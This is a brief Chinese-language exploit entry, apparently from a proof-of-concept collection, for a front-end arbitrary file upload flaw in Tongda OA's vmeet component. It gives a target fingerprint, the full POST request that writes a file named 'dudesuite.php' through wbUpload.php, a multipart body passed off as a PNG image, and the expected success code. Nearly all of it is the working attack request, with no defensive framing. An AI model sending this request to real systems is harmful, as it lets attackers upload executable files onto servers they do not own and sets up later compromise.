# 通达OAvmeet前台任意文件上传漏洞

- **系统**：通达OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="office Anywhere"`
- **请求**：`POST /general/vmeet/wbUpload.php?fileName=dudesuite.php+ HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------307…`

**请求体 / payload**
```
-----------------------------307456622713326098592248556830
Content-Disposition: form-data; name="Filedata"; filename="1.png"
Content-Type: image/png
dudesuite
-----------------------------307456622713326098592248556830--
```
- **预期**：200　|　—